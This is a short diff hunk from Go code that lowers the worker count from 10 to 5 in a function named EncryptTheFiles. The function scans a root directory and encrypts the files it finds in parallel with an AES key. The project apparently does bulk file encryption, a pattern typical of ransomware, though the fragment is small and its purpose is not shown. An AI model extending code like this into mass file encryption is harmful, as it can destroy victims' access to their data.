@@ -121,7 +121,7 @@ func EncryptTheFiles(rootDir string, aesKey []byte) {
 	fileTasks := fileScanner.ToFileTasks()
 
 	// Number of workers to process files concurrently
-	numWorkers := 10
+	numWorkers := 5
 
 	// Encrypt files in parallel
 	EncryptFilesInParallel(aesKey, fileTasks, numWorkers)
